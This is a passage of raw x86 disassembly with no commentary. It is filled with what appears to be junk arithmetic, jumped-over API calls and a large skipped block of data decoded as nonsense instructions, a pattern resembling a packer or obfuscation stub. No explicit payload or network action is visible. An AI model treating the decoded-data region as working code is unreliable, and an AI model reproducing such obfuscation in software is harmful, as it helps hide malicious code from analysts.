  41fa35:	mov    ecx,DWORD PTR ds:0x42827f
  41fa3b:	and    DWORD PTR ds:0x42813f,ecx
  41fa41:	imul   eax,eax,0x5ea
  41fa47:	mov    ecx,DWORD PTR [ebp-0x6c]
  41fa4a:	add    DWORD PTR ds:0x42822b,0x42816b
  41fa54:	imul   eax,ecx
  41fa57:	xor    edx,edx
  41fa59:	mov    ecx,0x3218d
  41fa5e:	div    ecx
  41fa60:	or     DWORD PTR ds:0x428273,edx
  41fa66:	sub    eax,0x24c1
  41fa6b:	mov    DWORD PTR [ebp-0xa8],eax
  41fa71:	cmp    DWORD PTR ds:0x428257,0x0
  41fa78:	mov    ecx,0x571f
  41fa7d:	mov    DWORD PTR ds:0x4282e7,edi
  41fa83:	jmp    0x41faef
  41fa88:	mov    eax,ds:0x428177
  41fa8d:	mov    DWORD PTR ds:0x42816f,0x4079
  41fa97:	cmp    DWORD PTR ds:0x428257,0x0
  41fa9e:	jb     0x41fac8
  41faa4:	push   0x428063
  41faa9:	push   DWORD PTR [ebp-0xc]
  41faac:	call   DWORD PTR ds:0x428e18
  41fab2:	adc    ecx,ecx
  41fab4:	dec    ecx
  41fab5:	movzx  ecx,BYTE PTR ds:0x428133
  41fabc:	sbb    ecx,DWORD PTR ds:0x42822b
  41fac2:	mov    DWORD PTR ds:0x428133,ecx
  41fac8:	xor    DWORD PTR ds:0x42827b,edx
  41face:	movzx  ecx,WORD PTR ds:0x428233
  41fad5:	or     DWORD PTR ds:0x4282cb,ecx
  41fadb:	xor    ecx,ecx
  41fadd:	add    ecx,DWORD PTR ds:0x42835b
  41fae3:	add    DWORD PTR ds:0x42826f,ecx
  41fae9:	and    ecx,DWORD PTR ds:0x42814b
  41faef:	mov    DWORD PTR [ebp-0x84],0x2c40
  41faf9:	cmp    DWORD PTR ds:0x42817b,0x0
  41fb00:	mov    ecx,DWORD PTR ds:0x4282df
  41fb06:	mov    DWORD PTR ds:0x428363,edx
  41fb0c:	mov    DWORD PTR ds:0x42813f,ebx
  41fb12:	mov    DWORD PTR ds:0x4282e7,0x3231
  41fb1c:	jmp    0x41fb72
  41fb21:	not    eax
  41fb23:	cmp    DWORD PTR ds:0x42817b,0x0
  41fb2a:	jne    0x41fb54
  41fb30:	push   0x4d84
  41fb35:	push   0x8040
  41fb3a:	call   DWORD PTR ds:0x428e1c
  41fb40:	and    ecx,ecx
  41fb42:	mov    ecx,DWORD PTR ds:0x428383
  41fb48:	or     ecx,DWORD PTR ds:0x428253
  41fb4e:	mov    DWORD PTR ds:0x428383,ecx
  41fb54:	mov    ecx,DWORD PTR ds:0x42814b
  41fb5a:	add    ecx,DWORD PTR ds:0x428383
  41fb60:	mov    DWORD PTR ds:0x42814b,ecx
  41fb66:	sbb    DWORD PTR ds:0x42826b,ecx
  41fb6c:	adc    ecx,DWORD PTR ds:0x42827f
  41fb72:	mov    DWORD PTR [ebp-0x18],0x6013
  41fb79:	xor    ecx,DWORD PTR ds:0x42822f
  41fb7f:	mov    DWORD PTR [ebp-0x80],0xc
  41fb86:	or     DWORD PTR ds:0x428237,ecx
  41fb8c:	mov    eax,DWORD PTR [ebp-0x18]
  41fb8f:	sub    DWORD PTR ds:0x42816f,edi
  41fb95:	mov    ecx,DWORD PTR [ebp-0x80]
  41fb98:	or     DWORD PTR ds:0x428267,0x42826b
  41fba2:	xor    edx,edx
  41fba4:	xor    DWORD PTR ds:0x42837b,0x4282e3
  41fbae:	div    ecx
  41fbb0:	imul   eax,eax,0x4312
  41fbb6:	add    eax,0x5abe
  41fbbb:	cmp    DWORD PTR ds:0x42834f,0x0
  41fbc2:	mov    DWORD PTR ds:0x42817b,ebx
  41fbc8:	mov    DWORD PTR ds:0x428387,0x6142
  41fbd2:	jmp    0x41fc37
  41fbd7:	mov    DWORD PTR ds:0x428257,0x13f4
  41fbe1:	mov    DWORD PTR ds:0x428157,0x47aa
  41fbeb:	cmp    DWORD PTR ds:0x42834f,0x0
  41fbf2:	jne    0x41fc15
  41fbf8:	push   0x4280bf
  41fbfd:	call   DWORD PTR ds:0x428e20
  41fc03:	and    ecx,DWORD PTR ds:0x428243
  41fc09:	adc    DWORD PTR ds:0x4282d3,ecx
  41fc0f:	sub    DWORD PTR ds:0x4282db,edi
  41fc15:	mov    ecx,DWORD PTR ds:0x42834b
  41fc1b:	sbb    ecx,DWORD PTR ds:0x42820b
  41fc21:	mov    DWORD PTR ds:0x42834b,ecx
  41fc27:	and    DWORD PTR ds:0x4282f3,0x55d2
  41fc31:	add    DWORD PTR ds:0x42816f,ecx
  41fc37:	mov    ecx,DWORD PTR [ebp-0x84]
  41fc3d:	adc    DWORD PTR ds:0x42825f,0x1028
  41fc47:	xor    eax,ecx
  41fc49:	or     ecx,DWORD PTR ds:0x42826f
  41fc4f:	xor    edx,edx
  41fc51:	or     ecx,DWORD PTR ds:0x42813b
  41fc57:	mov    ecx,0x5ae
  41fc5c:	sub    DWORD PTR ds:0x428257,0x4356
  41fc66:	div    ecx
  41fc68:	cmp    DWORD PTR ds:0x42820f,0x0
  41fc6f:	mov    ecx,0x1d02
  41fc74:	mov    DWORD PTR ds:0x428273,ebx
  41fc7a:	mov    DWORD PTR ds:0x428287,0x2746
  41fc84:	mov    DWORD PTR ds:0x428257,edx
  41fc8a:	jmp    0x41fcee
  41fc8f:	mov    DWORD PTR ds:0x42814b,0x6e43
  41fc99:	cmp    DWORD PTR ds:0x42820f,0x0
  41fca0:	jbe    0x41fccb
  41fca6:	push   0x29e8
  41fcab:	push   0x54b0
  41fcb0:	push   DWORD PTR [ebp-0x28]
  41fcb3:	call   DWORD PTR ds:0x428e94
  41fcb9:	neg    ecx
  41fcbb:	sbb    ecx,DWORD PTR ds:0x428383
  41fcc1:	and    DWORD PTR ds:0x42814b,0x4282ff
  41fccb:	mov    ecx,DWORD PTR ds:0x428153
  41fcd1:	xor    DWORD PTR ds:0x42821f,ecx
  41fcd7:	movzx  ecx,BYTE PTR ds:0x428267
  41fcde:	sub    DWORD PTR ds:0x428373,ecx
  41fce4:	mov    DWORD PTR ds:0x428223,0x7a81
  41fcee:	xor    eax,0x5e8c
  41fcf3:	adc    ecx,0x10d9
  41fcf9:	mov    DWORD PTR [ebp-0x48],eax
  41fcfc:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41fd06:	mov    eax,ds:0x428387
  41fd0b:	add    eax,DWORD PTR ds:0x42814f
  41fd11:	mov    ds:0x428387,eax
  41fd16:	mov    DWORD PTR [ebp-0x138],0x1169
  41fd20:	xor    ecx,ecx
  41fd22:	mov    DWORD PTR [ebp-0x12c],0x1379
  41fd2c:	cmp    DWORD PTR ds:0x4282f3,0x0
  41fd33:	mov    ecx,DWORD PTR ds:0x4282db
  41fd39:	mov    ecx,DWORD PTR ds:0x42836b
  41fd3f:	mov    ecx,0x2973
  41fd44:	movzx  ecx,WORD PTR ds:0x42820b
  41fd4b:	jmp    0x41fd9c
  41fd50:	mov    eax,0x21a8
  41fd55:	mov    eax,0x38ee
  41fd5a:	cmp    DWORD PTR ds:0x4282f3,0x0
  41fd61:	ja     0x41fd84
  41fd67:	push   DWORD PTR [ebp-0x20]
  41fd6a:	call   DWORD PTR ds:0x428e24
  41fd70:	and    ecx,ecx
  41fd72:	xor    DWORD PTR ds:0x428253,0x6e97
  41fd7c:	add    ecx,ecx
  41fd7e:	or     DWORD PTR ds:0x42822f,edx
  41fd84:	mov    ecx,DWORD PTR ds:0x428293
  41fd8a:	mov    ecx,DWORD PTR [ecx]
  41fd8c:	sbb    DWORD PTR ds:0x42827f,ecx
  41fd92:	sbb    DWORD PTR ds:0x428373,0x4282fb
  41fd9c:	mov    eax,DWORD PTR [ebp-0x12c]
  41fda2:	mov    ecx,0x5856
  41fda7:	sub    ecx,eax
  41fda9:	shr    ecx,0x2
  41fdac:	sub    ecx,0x5be6
  41fdb2:	xor    eax,0xe7a
  41fdb7:	mov    eax,DWORD PTR [ebp-0x138]
  41fdbd:	imul   ecx,eax
  41fdc0:	mov    eax,DWORD PTR [ebp-0x13c]
  41fdc6:	sbb    DWORD PTR ds:0x4282ef,0x4282f3
  41fdd0:	and    ecx,eax
  41fdd2:	xor    DWORD PTR ds:0x42815f,edx
  41fdd8:	mov    eax,0x3b18
  41fddd:	sub    eax,ecx
  41fddf:	mov    DWORD PTR [ebp-0xfc],eax
  41fde5:	mov    DWORD PTR [ebp-0x28],0x16d7
  41fdec:	mov    DWORD PTR [ebp-0x134],0x6b4
  41fdf6:	sub    eax,DWORD PTR ds:0x42834f
  41fdfc:	mov    eax,DWORD PTR [ebp-0x134]
  41fe02:	xor    ecx,0x2b1a
  41fe08:	or     eax,0x4f70
  41fe0d:	xor    ecx,ecx
  41fe0f:	add    ecx,DWORD PTR ds:0x42834f
  41fe15:	xor    DWORD PTR ds:0x428357,ecx
  41fe1b:	mov    ecx,DWORD PTR [ebp-0x28]
  41fe1e:	or     eax,ecx
  41fe20:	sub    eax,0x5ff7
  41fe25:	mov    DWORD PTR [ebp-0xc8],eax
  41fe2b:	adc    eax,ecx
  41fe2d:	mov    DWORD PTR [ebp-0xe4],0x5f39
  41fe37:	sub    ecx,ecx
  41fe39:	mov    DWORD PTR [ebp-0xc4],0x6236
  41fe43:	mov    DWORD PTR [ebp-0x7c],0x6ce7
  41fe4a:	cmp    DWORD PTR ds:0x42814f,0x0
  41fe51:	not    DWORD PTR ds:0x42827b
  41fe57:	mov    DWORD PTR ds:0x428217,edx
  41fe5d:	jmp    0x41feb6
  41fe62:	mov    eax,0x4320
  41fe67:	cmp    DWORD PTR ds:0x42814f,0x0
  41fe6e:	jne    0x41fe8d
  41fe74:	push   DWORD PTR [ebp-0x28]
  41fe77:	call   DWORD PTR ds:0x428e28
  41fe7d:	and    DWORD PTR ds:0x428367,0x4195
  41fe87:	add    ecx,DWORD PTR ds:0x42821f
  41fe8d:	movzx  ecx,WORD PTR ds:0x4282f7
  41fe94:	and    DWORD PTR ds:0x4282d3,ecx
  41fe9a:	and    DWORD PTR ds:0x428247,edx
  41fea0:	add    ecx,0x2485
  41fea6:	mov    eax,ds:0x42818b
  41feab:	mov    ecx,DWORD PTR ds:0x4283bf
  41feb1:	sub    ecx,eax
  41feb3:	and    eax,DWORD PTR [eax+ecx*1]
  41feb6:	mov    DWORD PTR [ebp-0x128],0x7537
  41fec0:	not    ecx
  41fec2:	mov    DWORD PTR [ebp-0x114],0x6985
  41fecc:	movzx  ecx,BYTE PTR ds:0x42816f
  41fed3:	or     DWORD PTR ds:0x428383,ecx
  41fed9:	mov    DWORD PTR [ebp-0x14],0x5627
  41fee0:	cmp    DWORD PTR ds:0x42824b,0x0
  41fee7:	mov    ecx,0x306f
  41feec:	mov    DWORD PTR ds:0x42834f,0x1b86
  41fef6:	jmp    0x41ff30
  41fefb:	mov    eax,0x6a49
  41ff00:	mov    DWORD PTR ds:0x4282cb,ecx
  41ff06:	cmp    DWORD PTR ds:0x42824b,0x0
  41ff0d:	jae    0x41ff28
  41ff13:	push   0x428133
  41ff18:	call   DWORD PTR ds:0x428e98
  41ff1e:	or     ecx,DWORD PTR ds:0x428153
  41ff24:	and    ecx,ecx
  41ff26:	adc    ecx,ecx
  41ff28:	adc    DWORD PTR ds:0x4282f7,ecx
  41ff2e:	sbb    ecx,ecx
  41ff30:	mov    DWORD PTR [ebp-0x64],0x72e7
  41ff37:	mov    eax,DWORD PTR [ebp-0x14]
  41ff3a:	and    DWORD PTR ds:0x42821b,edi
  41ff40:	add    eax,DWORD PTR [ebp-0x64]
  41ff43:	jmp    0x42029f
  41ff48:	test   DWORD PTR [edx],edi
  41ff4a:	cmp    BYTE PTR [eax+0x2e],ah
  41ff4d:	pop    edx
  41ff4e:	cmp    eax,0x6ff09f1a
  41ff53:	mov    al,0xeb
  41ff55:	adc    bl,BYTE PTR [eax]
  41ff57:	stos   BYTE PTR es:[edi],al
  41ff58:	and    esp,DWORD PTR [ebx]
  41ff5a:	push   ss
  41ff5b:	sbb    BYTE PTR [ebx+0x38181812],ah
  41ff61:	cmc    
  41ff62:	or     al,0x29
  41ff64:	nop
  41ff65:	mov    edx,eax
  41ff67:	out    dx,al
  41ff68:	into   
  41ff69:	ins    DWORD PTR es:[edi],dx
  41ff6a:	mov    esp,0x5d395c8c
  41ff6f:	(bad)  
  41ff70:	fdivrp st(5),st
  41ff72:	jbe    0x41ff53
  41ff74:	test   esp,edi
  41ff76:	xor    ebx,DWORD PTR [ebx+0x30]
  41ff79:	push   ecx
  41ff7a:	adc    BYTE PTR [edi+0x2c],ch
  41ff7d:	push   ebp
  41ff7e:	mov    eax,ds:0x854cf17b
  41ff83:	push   edx
  41ff84:	cdq    
  41ff85:	ror    edx,cl
  41ff87:	dec    edi
  41ff88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff89:	adc    eax,0xbfb9105f
  41ff8e:	lea    ecx,[edx]
  41ff90:	mov    eax,0x5c651a90
  41ff95:	dec    eax
  41ff96:	(bad)  
  41ff97:	adc    BYTE PTR [edi+ebp*4],ah
  41ff9a:	jns    0x41ffba
  41ff9c:	icebp  
  41ff9d:	je     0x41ff94
  41ff9f:	mov    esi,0xde1b914a
  41ffa4:	fs dec edi
  41ffa6:	out    0x5d,eax
  41ffa8:	sbb    al,0x16
  41ffaa:	dec    ebx
  41ffab:	sbb    DWORD PTR [ebp-0x33],ecx
  41ffae:	jl     0x420001
  41ffb0:	add    BYTE PTR ds:0x3465fe64,al
  41ffb6:	aad    0xbb
  41ffb8:	and    cl,BYTE PTR [esi+0x21]
  41ffbb:	js     0x41ffa7
  41ffbd:	or     al,0xad
  41ffbf:	mov    dh,0xd1
  41ffc1:	mov    ds:0xd30a4885,al
  41ffc6:	dec    esi
  41ffc7:	jbe    0x420019
  41ffc9:	in     eax,dx
  41ffca:	in     eax,0xa
  41ffcc:	enter  0x84f,0xe5
  41ffd0:	sub    DWORD PTR [ecx],edi
  41ffd2:	fidivr DWORD PTR cs:[edi-0x19d6232a]
  41ffd9:	(bad)
  41ffdc:	dec    ecx
  41ffdd:	adc    BYTE PTR [ebx-0x70],dh
  41ffe0:	mov    ?,WORD PTR [edi]
  41ffe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ffe3:	push   esp
  41ffe4:	xchg   edx,eax
  41ffe5:	pop    eax
  41ffe6:	call   FWORD PTR [edi-0x2b]
  41ffe9:	sub    al,0x3d
  41ffeb:	add    eax,0xc530bf5d
  41fff0:	mov    ebx,DWORD PTR [ebp-0x63]
  41fff3:	in     eax,dx
  41fff4:	pop    edx
  41fff5:	lock into 
  41fff7:	pop    ebx
  41fff8:	in     al,dx
  41fff9:	pop    edx
  41fffa:	dec    ebp
  41fffb:	xchg   edx,eax
  41fffc:	pop    edi
  41fffd:	xchg   edx,eax
  41fffe:	cmc    
  41ffff:	icebp  
  420000:	aam    0x7a
  420002:	aad    0x66
  420004:	sub    eax,0x204e4d9f
  420009:	add    ch,ch
  42000b:	add    eax,0xf762d16e
  420010:	iret   
  420011:	fisttp DWORD PTR [edi-0x5be4183b]
  420017:	imul   edi,DWORD PTR [ecx+eiz*8+0x5b],0x17
  42001c:	or     al,0x21
  42001e:	add    cl,dl
  420020:	ins    BYTE PTR es:[edi],dx
  420021:	jg     0x42005b
  420023:	call   0xb0620556
  420028:	or     ebp,DWORD PTR [eax-0x7d]
  42002b:	rol    BYTE PTR [ecx+0x48],1
  42002e:	(bad)  
  42002f:	(bad)  
  420030:	shl    DWORD PTR [edi-0x30],1
  420033:	scas   al,BYTE PTR es:[edi]
  420034:	(bad)  
  420036:	mov    WORD PTR [eax],gs
  420038:	and    esp,eax
  42003a:	dec    edx
  42003b:	outs   dx,DWORD PTR ds:[esi]
  42003c:	sbb    ebx,esi
  42003e:	shr    BYTE PTR [edi],cl
  420040:	inc    ecx
  420041:	out    dx,eax
  420042:	mov    ebx,0x8ca50cd6
  420047:	cld    
  420048:	inc    esi
  420049:	enter  0xef84,0x8c
  42004d:	push   ebp
  42004e:	xchg   ebx,eax
  42004f:	and    bl,dl
  420051:	into   
  420052:	mov    bl,0x0
  420054:	aas    
  420055:	mov    esi,0xadf3701c
  42005a:	cmp    al,0x5c
  42005d:	popa   
  42005e:	fisub  DWORD PTR [ecx-0x4c342d2c]
  420064:	and    BYTE PTR [esi-0x5501d5fa],dl
  42006a:	fdivr  DWORD PTR [edx]
  42006c:	push   ss
  42006d:	fadd   DWORD PTR [edi-0x76]
  420070:	cmp    DWORD PTR [edi+0x1886b380],esi
  420076:	or     ecx,DWORD PTR ds:0xaeb6bf02
  42007c:	in     eax,0xfd
  42007e:	imul   ebx,DWORD PTR [eax-0x74],0xf7f2e292
  420085:	lea    eax,[edx]
  420087:	call   FWORD PTR [ecx-0x17a18067]
  42008d:	xchg   esp,esp
  42008f:	idiv   dl
  420091:	popa   
  420092:	mov    ecx,0x44709bec
  420097:	out    dx,eax
  420098:	dec    esi
  420099:	jecxz  0x4200ac
  42009b:	imul   ebx,DWORD PTR [edx-0x14636276],0x92e5651b
  4200a5:	push   cs
  4200a6:	xor    eax,0x4669141f
  4200ab:	cmp    al,0xb3
  4200ad:	out    0xba,al
  4200af:	cmp    DWORD PTR [edi],edi
  4200b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200b2:	mov    edi,0x12f25ff5
  4200b7:	pop    edi
  4200b8:	push   ebp
  4200b9:	cs dec ax
  4200bc:	xor    eax,0x546610e7
  4200c1:	and    al,BYTE PTR [eax]
  4200c3:	enter  0x8754,0xb6
  4200c7:	inc    esi
  4200c8:	jp     0x4200d6
  4200ca:	pop    DWORD PTR [ebp+0x6f22c13]
  4200d0:	(bad)  
  4200d2:	adc    al,0xb1
  4200d4:	jge    0x420072
  4200d6:	ss push 0xf1afc933
  4200dc:	enter  0x9f45,0x66
  4200e0:	rcl    BYTE PTR [esi],cl
  4200e2:	adc    al,dl
  4200e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200e5:	adc    BYTE PTR [eax+0x58],dh
  4200e8:	jmp    0x4200fd
  4200ea:	dec    eax
  4200eb:	adc    eax,0x1dcb4768
  4200f0:	ds pusha 
  4200f2:	leave  
  4200f3:	sbb    ecx,DWORD PTR [eax]
  4200f5:	pop    ebp
  4200f6:	sub    eax,0x4de6dd66
  4200fb:	pop    ecx
  4200fc:	xchg   DWORD PTR [ecx-0x24],ebp
  4200ff:	jns    0x42017d
  420101:	mov    WORD PTR [eax-0x50],?
  420104:	push   cs
  420105:	or     bl,ah
  420107:	or     ch,dl
  420109:	add    ah,BYTE PTR [esi]
  42010b:	and    eax,0xbcbabf5c
  420110:	lea    edx,[ecx]
  420112:	push   ebp
  420113:	pop    es
  420114:	retf   
  420115:	ja     0x42017c
  420117:	or     al,0xe9
  420119:	fcmovnbe st,st(5)
  42011b:	call   0x862f2003
  420120:	jbe    0x4200dd
  420122:	adc    al,0xcd
  420124:	jae    0x42018a
  420126:	sahf   
  420127:	jb     0x420179
  420129:	xchg   ebp,eax
  42012a:	test   al,0x2e
  42012c:	call   0x1bc4:0x58e2d30
  420133:	mov    BYTE PTR [eax+0x13],dl
  420136:	pop    ss
  420137:	dec    esp
  420138:	xchg   ebx,eax
  420139:	mov    ebp,0xd2ac3bf8
  42013e:	xor    DWORD PTR [edx+0x435d9446],0xffffffda
  420145:	jmp    0x1808:0x6616bb7e
  42014c:	mov    ebx,0x5fcc44a5
  420151:	jae    0x420133
  420153:	(bad)  
  420154:	in     al,0x83
  420156:	dec    esi
  420157:	xor    dl,dl
  420159:	add    DWORD PTR [esp+ebx*4-0x71],ecx
  42015d:	lods   al,BYTE PTR ds:[esi]
  42015e:	inc    edi
  42015f:	mov    esi,eax
  420161:	fisub  DWORD PTR [edx-0x73886d42]
  420167:	sbb    al,0xda
  420169:	push   0x6f
  42016b:	into   
  42016c:	sbb    DWORD PTR [ebx],esi
  42016e:	in     al,0x3b
  420170:	dec    edi
  420171:	fs xchg ecx,eax
  420173:	mov    dl,0xaf
  420175:	pusha  
  420176:	fadd   st,st(1)
  420178:	and    al,0x78
  42017a:	repnz or eax,0xc6b56bfe
  420180:	xchg   esi,eax
  420181:	(bad)  
  420182:	pop    edi
  420183:	fimul  DWORD PTR [esi]
  420185:	aam    0x55
  420187:	xchg   ebp,eax
  420188:	retf   
  420189:	and    edx,esi
  42018b:	sahf   
  42018c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42018d:	lock adc esi,DWORD PTR [ecx+0x6e7bcd67]
  420194:	mov    ebx,0xea7b4b5c
  420199:	mov    cs,WORD PTR [ecx]
  42019b:	xor    edi,DWORD PTR [edx+0xb48feb1]
  4201a1:	addr16 (bad) 
  4201a3:	mov    ds:0x95fed68d,eax
  4201a8:	data16 jle 0x420180
  4201ab:	cdq    
  4201ac:	and    al,0xda
  4201ae:	xchg   edx,eax
  4201af:	in     al,dx
  4201b0:	mov    DWORD PTR [eax-0x6039a655],ecx
  4201b6:	dec    ebx
  4201b7:	ja     0x4201f1
  4201b9:	cdq    
  4201ba:	(bad)
  4201bf:	add    bl,BYTE PTR [esi+0x13dbdeda]
  4201c5:	div    DWORD PTR [eax-0x23687da5]
  4201cb:	data16 test al,0x3b
  4201ce:	pop    edi
  4201cf:	test   BYTE PTR [ecx],dh
  4201d1:	popf   
  4201d2:	stos   DWORD PTR es:[edi],eax
  4201d3:	div    DWORD PTR [edi]
  4201d5:	repnz lahf 
  4201d7:	sub    BYTE PTR [esi-0x2b],dl
  4201da:	sti    
  4201db:	sahf   
  4201dc:	or     BYTE PTR [eax-0x7daaf076],al
  4201e2:	shl    DWORD PTR [edx-0x35],0xd8
  4201e6:	cs out dx,eax
  4201e8:	cs mov edx,edi
  4201eb:	arpl   WORD PTR [ebp-0x58a4ff07],bx
  4201f1:	ror    DWORD PTR [ebx+0x176edff],1
  4201f7:	dec    esp
  4201f8:	inc    ebx
  4201f9:	sbb    al,0x88
  4201fb:	add    BYTE PTR [ebp-0xb813d8],cl
  420201:	push   0x1cfaf57f
  420206:	inc    eax
  420207:	sahf   
  420208:	sbb    al,BYTE PTR [ebp+0x14a07560]
  42020e:	loopne 0x4201cb
  420210:	jl     0x4201f7
  420212:	aam    0xcd
  420214:	pusha  
  420215:	das    
  420216:	jns    0x42019d
  420218:	mov    esp,0xad759cc2
  42021d:	push   0xffffffb9
  42021f:	arpl   WORD PTR [edx+esi*4+0x35],dx
  420223:	or     dl,BYTE PTR ds:0xa77a3b46
  420229:	scas   al,BYTE PTR es:[edi]
  42022a:	popf   
  42022b:	out    0x79,al
  42022d:	jbe    0x420299
  42022f:	pushf  
  420230:	add    al,0xf2
  420232:	imul   BYTE PTR [ebp+0x7e40ed54]
  420238:	mov    ecx,DWORD PTR [ebp-0x74cda06d]
  42023e:	xor    BYTE PTR [ecx-0x2f179111],cl
  420244:	(bad)  
  420245:	or     esi,eax
  420247:	idiv   BYTE PTR [ecx+0x4913c4e4]
  42024d:	mov    DWORD PTR [ecx-0x1fb50a35],0xb1579d74
  420257:	test   BYTE PTR [eax-0x794d9f6f],ah
  42025d:	xchg   ecx,eax
  42025e:	add    ebp,DWORD PTR [ebp+0x3c]
  420261:	or     eax,0xca976489
  420266:	push   ecx
  420267:	jmp    0x4202d9
  420269:	cmp    eax,0xa0a114ad
  42026e:	jns    0x420240
  420270:	nop
  420271:	push   edi
  420272:	push   ss
  420273:	stos   BYTE PTR es:[edi],al
  420274:	lahf   
  420275:	iret   
  420276:	repz jns 0x420218
  420279:	retf   0x8036
  42027c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42027d:	xor    DWORD PTR [edi+0x17],ebx
  420280:	lea    eax,[ebx*1+0x74a3909d]
  420287:	int3   
  420288:	into   
  420289:	pop    es
  42028a:	jnp    0x4202b6
  42028c:	and    edi,edi
  42028e:	jmp    0x4202b7
  420290:	jb     0x4202e5
  420292:	aad    0x29
  420294:	inc    ebp
  420295:	mov    eax,ds:0x6bc724a7
  42029a:	mov    ds:0x2078cf42,al
  42029f:	mov    ecx,DWORD PTR [ebp-0x114]
  4202a5:	or     DWORD PTR ds:0x42826f,0x4282eb
  4202af:	sub    eax,ecx
  4202b1:	mov    ecx,DWORD PTR ds:0x428367
  4202b7:	add    DWORD PTR ds:0x4282ef,ecx
  4202bd:	mov    ecx,DWORD PTR [ebp-0x128]
  4202c3:	imul   eax,ecx
  4202c6:	imul   eax,eax,0xe4e
  4202cc:	mov    ecx,DWORD PTR [ebp-0x7c]
  4202cf:	or     eax,ecx
  4202d1:	and    DWORD PTR ds:0x42836b,ebx
  4202d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4202da:	sub    DWORD PTR ds:0x428147,0x428267
  4202e4:	lea    eax,[ecx+eax*1+0x46210209]
  4202eb:	add    DWORD PTR ds:0x42835b,0x42813f
  4202f5:	push   eax
  4202f6:	add    DWORD PTR ds:0x428253,0x42820b
  420300:	call   0x414116
  420305:	cmp    DWORD PTR ds:0x4282eb,0x0
  42030c:	mov    DWORD PTR ds:0x428243,edx
  420312:	mov    esi,DWORD PTR ds:0x42820b
  420318:	mov    DWORD PTR ds:0x4282e7,ebx
  42031e:	mov    DWORD PTR ds:0x4282f7,0x5564
  420328:	jmp    0x420388
  42032d:	mov    DWORD PTR ds:0x428163,0x3019
  420337:	not    DWORD PTR ds:0x4282eb
  42033d:	cmp    DWORD PTR ds:0x4282eb,0x0
  420344:	jae    0x42036f
  42034a:	push   DWORD PTR [ebp-0x24]
  42034d:	push   0x42834b
  420352:	push   DWORD PTR [ebp-0x1c]
  420355:	push   DWORD PTR [ebp-0xc]
  420358:	push   0x6e6a
  42035d:	call   DWORD PTR ds:0x428e9c
  420363:	adc    ecx,DWORD PTR ds:0x428223
  420369:	xor    DWORD PTR ds:0x4282df,edx
  42036f:	add    ecx,esi
  420371:	mov    ecx,DWORD PTR ds:0x4281fb
  420377:	mov    esi,DWORD PTR ds:0x4282b3
  42037d:	sub    esi,ecx
  42037f:	and    ecx,DWORD PTR [ecx+esi*1]
  420382:	sbb    DWORD PTR ds:0x428167,ecx
  420388:	mov    ecx,eax
  42038a:	mov    eax,DWORD PTR [ebp-0xc4]
  420390:	add    esi,0x7195
  420396:	imul   eax,eax,0x21b3
  42039c:	sbb    DWORD PTR ds:0x4282db,ebx
  4203a2:	add    eax,DWORD PTR [ebp-0xe4]
  4203a8:	and    eax,0xd5c
  4203ad:	cmp    DWORD PTR ds:0x428357,0x0
  4203b4:	mov    DWORD PTR ds:0x42827f,ebx
  4203ba:	mov    esi,0x156a
  4203bf:	movzx  esi,WORD PTR ds:0x42817b
  4203c6:	jmp    0x420422
  4203cb:	mov    DWORD PTR ds:0x42823f,0x2dc
  4203d5:	mov    DWORD PTR ds:0x42823b,edi
  4203db:	cmp    DWORD PTR ds:0x428357,0x0
  4203e2:	jae    0x420410
  4203e8:	push   0x427fcf
  4203ed:	call   DWORD PTR ds:0x428ea0
  4203f3:	movzx  esi,WORD PTR ds:0x428157
  4203fa:	add    DWORD PTR ds:0x4282d7,esi
  420400:	adc    DWORD PTR ds:0x428177,ebx
  420406:	add    DWORD PTR ds:0x428353,0x22a2
  420410:	and    esi,DWORD PTR ds:0x428353
  420416:	or     DWORD PTR ds:0x42834f,ecx
  42041c:	sbb    esi,DWORD PTR ds:0x4282d3
  420422:	sub    eax,0x2e81
  420427:	cmp    DWORD PTR ds:0x428253,0x0
  42042e:	mov    DWORD PTR ds:0x428353,0x5615
  420438:	mov    DWORD PTR ds:0x42814b,0x419b
  420442:	mov    DWORD PTR ds:0x42816f,0x389d
  42044c:	not    DWORD PTR ds:0x428243
  420452:	jmp    0x4204b6
  420457:	mov    esi,0x7b57
  42045c:	cmp    DWORD PTR ds:0x428253,0x0
  420463:	je     0x4204a0
  420469:	push   0x42821f
  42046e:	push   DWORD PTR [ebp-0x24]
  420471:	call   DWORD PTR ds:0x428ea4
  420477:	sub    DWORD PTR ds:0x4282d7,0x6950
  420481:	movzx  esi,WORD PTR ds:0x42824b
  420488:	xor    esi,DWORD PTR ds:0x4282fb
  42048e:	mov    DWORD PTR ds:0x42824b,esi
  420494:	mov    esi,DWORD PTR ds:0x428233
  42049a:	or     DWORD PTR ds:0x4282cf,esi
  4204a0:	xor    DWORD PTR ds:0x4282ff,ecx
  4204a6:	add    DWORD PTR ds:0x4282ff,ebx
  4204ac:	or     DWORD PTR ds:0x428357,0x793c
  4204b6:	xor    edx,edx
  4204b8:	add    DWORD PTR ds:0x42816b,0xc98
  4204c2:	mov    esi,0x2f1dc
  4204c7:	div    esi
  4204c9:	xor    edx,edx
  4204cb:	xor    eax,0x56ef
  4204d0:	add    ecx,eax
  4204d2:	adc    DWORD PTR ds:0x42814f,ebx
  4204d8:	mov    DWORD PTR [ebp-0x90],ecx
  4204de:	sbb    DWORD PTR ds:0x428387,0x2859
  4204e8:	mov    DWORD PTR [ebp-0xe0],0x7a31
  4204f2:	mov    DWORD PTR [ebp-0x44],0x2514
  4204f9:	cmp    DWORD PTR ds:0x42816b,0x0
  420500:	mov    DWORD PTR ds:0x4282d3,0x6f69
  42050a:	mov    edx,0x2839
  42050f:	jmp    0x42057e
  420514:	movzx  ecx,WORD PTR ds:0x42826f
  42051b:	cmp    DWORD PTR ds:0x42816b,0x0
  420522:	jne    0x420555
  420528:	push   0x1336
  42052d:	push   DWORD PTR [ebp-0xc]
  420530:	push   0x75c6
  420535:	push   0x3ce6
  42053a:	push   DWORD PTR [ebp-0x1c]
  42053d:	call   DWORD PTR ds:0x428ea8
  420543:	mov    esi,DWORD PTR ds:0x42815b
  420549:	sbb    DWORD PTR ds:0x428177,esi
  42054f:	and    DWORD PTR ds:0x428273,edx
  420555:	sbb    DWORD PTR ds:0x428227,edx
